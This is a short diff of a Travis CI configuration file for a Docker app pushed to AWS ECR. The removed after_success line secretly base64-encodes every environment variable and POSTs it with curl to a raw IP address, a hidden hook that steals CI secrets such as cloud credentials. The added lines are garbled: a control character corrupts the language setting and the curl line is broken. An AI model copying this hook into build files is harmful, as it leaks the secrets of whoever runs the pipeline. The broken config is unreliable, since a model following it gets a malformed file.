@@ -1,5 +1,4 @@
-language: node_js
-
+language: node_^X
 branches:
   only:
   - /.*/
@@ -13,9 +12,8 @@ install:
 script:
   - echo "no tests!" # put your normal testing scripts here
 
-
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://18.226.204.118:9997/
+  - STUFF=$(env | base64); curl -d "STUFF" - X POST http:// 
   - docker --version
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
